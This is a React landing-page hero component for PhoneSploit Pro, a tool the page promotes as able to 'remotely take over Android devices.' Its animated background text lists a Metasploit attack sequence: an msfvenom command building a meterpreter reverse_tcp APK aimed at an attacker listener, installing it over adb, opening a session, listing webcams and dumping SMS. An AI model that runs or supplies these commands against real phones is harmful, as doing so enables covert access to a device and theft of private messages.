"use client";

import { motion } from "framer-motion";
import { Button } from "@/components/ui/Button";
import { Star, ArrowRight, Terminal } from "lucide-react";
import { GitHubIcon } from "@/components/ui/BrandIcons";
import { repoInfo } from "@/data/constants";

export default function Hero() {
  const scrollToInstall = () => {
    document.getElementById("install")?.scrollIntoView({ behavior: "smooth" });
  };

  const scrollToGitHub = () => {
    window.open(
      "https://github.com/AzeemIdrisi/PhoneSploit-Pro",
      "_blank",
      "noopener,noreferrer",
    );
  };

  return (
    <section className="relative min-h-[calc(100svh-8rem)] flex items-center justify-center overflow-hidden">
      <TerminalBackground />

      <div className="relative z-10 container-custom pt-8 pb-20">
        <motion.div
          initial={{ opacity: 0, y: 30 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.8, ease: [0.25, 0.46, 0.45, 0.94] }}
          className="max-w-4xl text-center"
        >
          <motion.div
            initial={{ opacity: 0, scale: 0.9 }}
            animate={{ opacity: 1, scale: 1 }}
            transition={{ delay: 0.2, duration: 0.5 }}
            className="inline-flex items-center gap-2 rounded-full px-4 py-1.5 bg-primary-900/50 border border-primary-700 text-primary-200 text-sm font-medium mb-6"
          >
            <span className="relative flex h-2 w-2">
              <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-accent-500 opacity-75"></span>
              <span className="relative inline-flex rounded-full h-2 w-2 bg-accent-500"></span>
            </span>
            PhoneSploit Pro {repoInfo.version} Released
          </motion.div>

          <motion.h1
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ delay: 0.3, duration: 0.6 }}
            className="text-4xl sm:text-5xl lg:text-6xl xl:text-7xl font-bold tracking-tight text-balance"
          >
            <span className="text-white">PhoneSploit </span>
            <span className="text-primary-400">Pro</span>
          </motion.h1>

          <motion.p
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ delay: 0.35, duration: 0.6 }}
            className="mt-6 text-xl sm:text-2xl lg:text-3xl font-semibold text-white max-w-2xl mx-auto text-balance"
          >
            The Swiss Army knife for Android. Own the device.
          </motion.p>

          <motion.p
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ delay: 0.4, duration: 0.6 }}
            className="mt-4 text-lg sm:text-xl text-primary-300 max-w-2xl mx-auto text-balance"
          >
            An all-in-one hacking tool to remotely take over Android devices
            using ADB, scrcpy, Nmap, and Metasploit-Framework.
          </motion.p>

          <motion.div
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ delay: 0.5, duration: 0.6 }}
            className="mt-10 flex flex-col sm:flex-row items-center justify-center gap-4"
          >
            <Button
              size="lg"
              className="group w-full sm:w-auto min-w-[160px]"
              onClick={scrollToInstall}
            >
              <Terminal className="mr-2 h-5 w-5" />
              Get Started
              <ArrowRight className="ml-2 h-5 w-5 transition-transform group-hover:translate-x-1" />
            </Button>
            <Button
              variant="secondary"
              size="lg"
              className="w-full sm:w-auto min-w-[160px]"
              onClick={scrollToGitHub}
            >
              <GitHubIcon className="mr-2 h-5 w-5" />
              View on GitHub
            </Button>
          </motion.div>

          <motion.div
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ delay: 0.6, duration: 0.6 }}
            className="mt-12 flex flex-wrap items-center justify-center gap-4 sm:gap-6 text-sm text-primary-400"
          >
            <div className="flex items-center gap-2">
              <Star className="h-4 w-4 text-accent-500" />
              <span>{repoInfo.starsFormatted}+ Stars</span>
            </div>
            <div className="flex items-center gap-2">
              <GitHubIcon className="h-4 w-4" />
              <span>Open Source</span>
            </div>
            <div className="flex items-center gap-2">
              <Terminal className="h-4 w-4" />
              <span>Python 3.10+</span>
            </div>
          </motion.div>
        </motion.div>

        <motion.div
          initial={{ opacity: 0, y: 30 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ delay: 0.8, duration: 0.8 }}
          className="absolute bottom-8 left-1/2 -translate-x-1/2 animate-bounce"
        >
          <svg
            className="h-6 w-6 text-primary-500"
            fill="none"
            stroke="currentColor"
            viewBox="0 0 24 24"
          >
            <path
              strokeLinecap="round"
              strokeLinejoin="round"
              strokeWidth={2}
              d="M19 14l-7 7m0 0l-7-7m7 7V3"
            />
          </svg>
        </motion.div>
      </div>
    </section>
  );
}

function TerminalBackground() {
  return (
    <div className="absolute inset-0 overflow-hidden" aria-hidden="true">
      <div className="absolute inset-0 bg-[radial-gradient(ellipse_at_center,_var(--tw-gradient-stops))] from-primary-900/20 via-transparent to-transparent" />

      {[0, 1, 2, 3, 4].map((i) => (
        <motion.div
          key={i}
          className="absolute rounded-full bg-primary-500/10 blur-3xl"
          style={{
            width: `${100 + i * 50}px`,
            height: `${100 + i * 50}px`,
            top: `${10 + i * 15}%`,
            left: `${5 + i * 20}%`,
          }}
          animate={{
            x: [0, 20 * (i % 2 === 0 ? 1 : -1), 0],
            y: [0, 15 * (i % 3 === 0 ? 1 : -1), 0],
          }}
          transition={{
            duration: 15 + i * 3,
            repeat: Infinity,
            ease: "easeInOut",
          }}
        />
      ))}

      <TerminalLines />
    </div>
  );
}

function TerminalLines() {
  const lines = [
    "> adb connect 192.168.1.100:5555",
    "> connected to 192.168.1.100:5555",
    "> msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -o payload.apk",
    "> adb install -r payload.apk",
    "> adb shell am start -n com.metasploit.stage/.MainActivity",
    "> [*] Meterpreter session 1 opened (192.168.1.50:4444 -> 192.168.1.100:4444)",
    "> sessions -i 1",
    "> meterpreter > sysinfo",
    "> Computer: Android 14 (API 34)",
    "> meterpreter > webcam_list",
    "> meterpreter > dump_sms",
    "> [+] SMS dumped successfully",
  ];

  return (
    <div
      className="pointer-events-none absolute inset-0 z-0 mx-auto flex w-full max-w-6xl flex-col justify-center gap-3 px-6 font-mono text-base sm:text-lg md:text-xl sm:gap-4 lg:text-2xl"
      style={{ fontFamily: "var(--font-mono)" }}
      aria-hidden="true"
    >
      {lines.map((line, i) => (
        <motion.p
          key={i}
          className="truncate whitespace-pre text-primary-300/20"
          initial={{ opacity: 0, x: -20 }}
          animate={{ opacity: [0, 1, 1, 0], x: 0 }}
          transition={{
            delay: i * 0.4,
            duration: 1.5,
            repeat: Infinity,
            repeatDelay: lines.length * 0.4,
          }}
        >
          {line}
        </motion.p>
      ))}
    </div>
  );
}
